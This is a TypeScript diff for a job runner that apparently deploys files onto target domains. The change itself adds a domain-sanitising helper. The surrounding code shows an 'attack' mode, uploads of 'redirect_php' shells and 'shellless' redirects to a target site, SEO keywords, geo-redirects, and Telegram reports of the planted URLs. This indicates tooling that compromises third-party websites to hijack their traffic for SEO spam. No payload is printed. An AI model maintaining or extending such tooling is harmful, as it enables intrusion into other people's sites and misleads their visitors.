@@ -146,6 +146,30 @@ async function markDeployFailed(deployId: number, errorMessage: string, duration
 //  MAIN JOB EXECUTION
 // ═══════════════════════════════════════════════
 
+/**
+ * Extract bare domain from a string that might be a full URL.
+ * e.g. "https://example.com/path" → "example.com"
+ *      "http://example.com"       → "example.com"
+ *      "example.com"              → "example.com"
+ */
+export function sanitizeDomain(input: string): string {
+  if (!input) return input;
+  let cleaned = input.trim();
+  // If it looks like a URL, extract hostname
+  if (cleaned.match(/^https?:\/\//i)) {
+    try {
+      const url = new URL(cleaned);
+      return url.hostname;
+    } catch {
+      // Fallback: strip protocol manually
+      cleaned = cleaned.replace(/^https?:\/\//i, "");
+    }
+  }
+  // Remove trailing path/port
+  cleaned = cleaned.split("/")[0].split(":")[0];
+  return cleaned;
+}
+
 export interface StartJobParams {
   userId: number;
   targetDomain: string;
@@ -172,12 +196,14 @@ export async function startBackgroundJob(params: StartJobParams): Promise<{ depl
   const db = await getDb();
   if (!db) throw new Error("Database not available");
 
+  // Sanitize targetDomain — ensure it's a bare domain, not a full URL
+  const cleanDomain = sanitizeDomain(params.targetDomain);
   const keywords = parseSeoKeywords(params.seoKeywords);
 
   // 1. Create deploy record with status "running"
   const [result] = await db.insert(autonomousDeploys).values({
     userId: params.userId,
-    targetDomain: params.targetDomain,
+    targetDomain: cleanDomain,
     redirectUrl: params.redirectUrl,
     mode: (params.mode as "attack" | "fixated" | "emergent") || "emergent",
     goal: "full_deploy",
@@ -226,6 +252,7 @@ async function runPipelineInBackground(
 ) {
   const startTime = Date.now();
   const mode = params.mode || "emergent";
+  const cleanDomain = sanitizeDomain(params.targetDomain);
 
   // Create event callback that persists to DB
   const onEvent = (event: PipelineEvent) => {
@@ -256,7 +283,7 @@ async function runPipelineInBackground(
     await persistEvent(deployId, {
       phase: "prescreen",
       step: "init",
-      detail: `🚀 Background Job #${deployId} started — Mode: ${mode.toUpperCase()}, Target: ${params.targetDomain}`,
+      detail: `🚀 Background Job #${deployId} started — Mode: ${mode.toUpperCase()}, Target: ${cleanDomain}`,
       progress: 0,
     });
 
@@ -288,7 +315,7 @@ async function runPipelineInBackground(
 
     // ─── Build pipeline config ───
     const pipelineConfig: PipelineConfig = {
-      targetUrl: `https://${params.targetDomain}`,
+      targetUrl: `https://${cleanDomain}`,
       redirectUrl: params.redirectUrl,
       seoKeywords: keywords,
       geoRedirect: params.geoRedirect ?? true,
@@ -345,7 +372,7 @@ async function runPipelineInBackground(
       try {
         await sendTelegramNotification({
           type: "success",
-          targetUrl: params.targetDomain,
+          targetUrl: `https://${cleanDomain}`,
           redirectUrl: params.redirectUrl,
           deployedUrls: pipelineResult.verifiedFiles.map(f => f.url),
           shellType: "redirect_php",
@@ -407,7 +434,7 @@ async function runPipelineInBackground(
         const realDeployedUrls = pipelineResult?.uploadedFiles
           .filter(f => !f.method.startsWith("shellless_") || f.redirectWorks)
           .map(f => f.url)
-          .filter(url => url !== params.targetDomain) || [];
+          .filter(url => url !== cleanDomain && url !== `https://${cleanDomain}` && url !== `http://${cleanDomain}`) || [];
         const shelllessRedirects = pipelineResult?.uploadedFiles
           .filter(f => f.method.startsWith("shellless_") && f.redirectWorks)
           .map(f => `${f.url} (via ${f.method.replace("shellless_", "")})`) || [];
@@ -419,7 +446,7 @@ async function runPipelineInBackground(
 
         await sendTelegramNotification({
           type: "success",
-          targetUrl: params.targetDomain,
+          targetUrl: `https://${cleanDomain}`,
           redirectUrl: params.redirectUrl,
           deployedUrls,
           shellType: "redirect_php",
